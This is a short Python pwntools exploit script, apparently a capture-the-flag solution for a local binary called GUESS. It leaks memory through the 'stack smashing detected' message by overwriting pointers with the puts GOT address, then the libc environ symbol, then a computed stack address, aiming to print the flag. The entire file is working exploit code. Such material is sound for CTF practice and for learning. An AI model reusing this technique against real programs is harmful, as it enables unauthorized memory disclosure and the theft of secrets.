from pwn import *
context.log_level = 'debug'

sh = process('./GUESS')
libc = ELF('./libc.so.6')

puts_got = 0x602020

sh.recvuntil("guessing flag\n")
sh.sendline(p64(puts_got)*0x100)

sh.recvuntil("*** stack smashing detected ***: ")
gdb.attach(sh)

puts_addr = u64(sh.recvn(6).ljust(8,'\x00'))
libc.address = puts_addr- libc.symbols['puts']

environ = libc.symbols['environ']

sh.recvuntil("guessing flag\n")
sh.sendline(p64(environ)*0x100)

sh.recvuntil("*** stack smashing detected ***: ")
#gdb.attach(sh)

stack_addr = u64(sh.recvn(6).ljust(8,'\x00'))

sh.recvuntil("guessing flag\n")
sh.sendline(p64(stack_addr -0x168)*0x100)

sh.interactive()
